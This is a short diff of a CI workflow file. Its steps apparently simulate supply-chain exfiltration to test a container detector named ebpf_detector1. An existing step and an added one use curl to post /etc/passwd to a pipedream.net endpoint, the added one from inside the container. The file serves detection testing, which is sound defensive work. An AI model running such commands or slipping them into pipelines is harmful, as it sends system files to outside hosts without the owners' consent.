@@ -26,6 +26,9 @@ jobs:
         run: |
           curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
 
+      - name: Simulate supply chain exfiltration inside container
+        run: |
+          docker exec ebpf_detector1 curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
 
       - name: Simulasdsdste supply chain exfiltration
         run: |
